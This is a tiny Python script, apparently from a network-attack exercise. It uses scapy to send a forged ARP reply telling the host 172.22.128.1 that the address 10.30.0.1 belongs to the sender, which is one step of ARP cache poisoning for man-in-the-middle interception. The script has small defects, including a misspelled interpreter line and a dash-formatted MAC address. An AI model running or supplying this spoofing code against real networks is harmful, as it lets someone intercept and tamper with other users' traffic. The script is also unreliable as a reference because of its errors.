#!/usr/bin/env pyhton

import scapy.all as scapy

packet = scapy.ARP(op=2, pdst="172.22.128.1",hwdst="F2-34-90-E9-2B-3F", psrc="10.30.0.1")

scapy.send(packet)